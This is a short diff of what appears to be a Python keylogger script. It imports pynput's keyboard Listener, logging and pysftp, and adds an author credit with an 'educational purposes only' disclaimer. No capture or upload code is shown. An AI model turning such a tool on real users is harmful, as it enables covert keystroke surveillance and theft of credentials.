@@ -1,5 +1,10 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 import logging, pysftp
+
+# author: ggarcz1
+# NOTE: You are free to copy, edit, and use this code for EDUCATIONAL purposes only.
+# Authors and any contributors bear no responsibility for how you use this code!
+
 
 # must be on the harddrive not in an obscure folder to work
 # set config for the logging module
